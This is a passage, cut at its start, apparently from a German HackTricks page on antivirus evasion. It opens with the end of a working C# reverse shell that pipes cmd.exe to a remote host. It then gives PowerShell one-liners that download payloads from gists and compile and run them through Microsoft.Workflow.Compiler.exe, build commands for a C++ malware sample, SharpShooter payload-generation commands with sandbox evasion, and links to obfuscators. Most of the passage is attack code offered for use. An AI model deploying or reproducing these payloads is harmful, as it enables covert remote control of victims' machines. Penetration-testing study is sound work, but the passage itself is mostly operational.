using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# Obfuscators Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von Python für den Aufbau von Injektoren Beispiel:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
